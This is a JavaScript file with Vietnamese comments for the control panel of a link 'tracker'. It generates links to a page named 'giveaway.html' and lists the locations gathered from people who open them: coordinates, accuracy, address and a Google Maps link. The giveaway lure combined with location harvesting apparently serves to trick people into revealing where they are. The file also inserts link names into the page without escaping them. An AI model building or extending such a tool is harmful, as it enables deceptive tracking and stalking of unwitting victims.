// Khởi tạo dữ liệu
let links = JSON.parse(localStorage.getItem('trackerLinks')) || [];
let locations = JSON.parse(localStorage.getItem('trackerLocations')) || [];

// DOM Elements
const linkNameInput = document.getElementById('linkName');
const createLinkBtn = document.getElementById('createLink');
const linksList = document.getElementById('linksList');
const locationsList = document.getElementById('locationsList');

// Tạo một ID ngẫu nhiên
function generateRandomId() {
    return Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15);
}

// Lấy base URL cho GitHub Pages
function getBaseUrl() {
    // Nếu chạy trên GitHub Pages
    const ghPagesMatch = window.location.href.match(/https:\/\/([^.]+)\.github\.io\/([^\/]+)/);
    if (ghPagesMatch) {
        return `https://${ghPagesMatch[1]}.github.io/${ghPagesMatch[2]}`;
    }
    // Nếu chạy local hoặc server khác
    return window.location.origin + window.location.pathname.replace(/\/[^\/]*$/, '');
}

// Hiển thị danh sách link
function renderLinks() {
    linksList.innerHTML = '';
    
    if (links.length === 0) {
        linksList.innerHTML = '<li class="empty-message">Chưa có liên kết nào được tạo</li>';
        return;
    }
    
    links.forEach(link => {
        const li = document.createElement('li');
        const baseUrl = getBaseUrl();
        const fullUrl = `${baseUrl}/giveaway.html?id=${link.id}`;
        
        li.innerHTML = `
            <div class="link-info">
                <span class="link-name">${link.name}</span>
                <small class="link-date">Đã tạo: ${new Date(link.createdAt).toLocaleString()}</small>
            </div>
            <div class="link-actions">
                <input type="text" class="link-url" value="${fullUrl}" readonly>
                <button class="copy-btn" data-url="${fullUrl}">Sao chép</button>
            </div>
        `;
        
        const copyBtn = li.querySelector('.copy-btn');
        copyBtn.addEventListener('click', function() {
            const url = this.getAttribute('data-url');
            navigator.clipboard.writeText(url)
                .then(() => {
                    this.textContent = 'Đã sao chép!';
                    setTimeout(() => {
                        this.textContent = 'Sao chép';
                    }, 2000);
                })
                .catch(err => {
                    console.error('Không thể sao chép: ', err);
                });
        });
        
        linksList.appendChild(li);
    });
}

// Hiển thị danh sách vị trí đã thu thập
function renderLocations() {
    locationsList.innerHTML = '';
    
    if (locations.length === 0) {
        locationsList.innerHTML = '<li class="empty-message">Chưa có vị trí nào được thu thập</li>';
        return;
    }
    
    locations.forEach(location => {
        const li = document.createElement('li');
        const link = links.find(l => l.id === location.linkId);
        
        li.innerHTML = `
            <div class="location-info">
                <span class="location-name">${link ? link.name : 'Link không xác định'}</span>
                <small class="location-date">${new Date(location.timestamp).toLocaleString()}</small>
            </div>
            <div class="location-details">
                <p><strong>Vĩ độ:</strong> ${location.latitude}</p>
                <p><strong>Kinh độ:</strong> ${location.longitude}</p>
                <p><strong>Độ chính xác:</strong> ${location.accuracy} mét</p>
                ${location.address ? `<p><strong>Địa chỉ:</strong> ${location.address}</p>` : ''}
                <a href="https://www.google.com/maps?q=${location.latitude},${location.longitude}" target="_blank" class="map-link">Xem trên Google Maps</a>
            </div>
        `;
        
        locationsList.appendChild(li);
    });
}

// Kiểm tra các vị trí mới định kỳ
function checkForNewLocations() {
    const savedLocations = JSON.parse(localStorage.getItem('trackerLocations')) || [];
    if (savedLocations.length > locations.length) {
        locations = savedLocations;
        renderLocations();
    }
}

// Xử lý sự kiện tạo link mới
createLinkBtn.addEventListener('click', () => {
    const name = linkNameInput.value.trim();
    
    if (!name) {
        alert('Vui lòng nhập tên cho liên kết');
        return;
    }
    
    const newLink = {
        id: generateRandomId(),
        name: name,
        createdAt: new Date().toISOString()
    };
    
    links.push(newLink);
    localStorage.setItem('trackerLinks', JSON.stringify(links));
    
    linkNameInput.value = '';
    renderLinks();
});

// Khởi tạo ứng dụng
renderLinks();
renderLocations();

// Kiểm tra vị trí mới mỗi 10 giây
setInterval(checkForNewLocations, 10000); 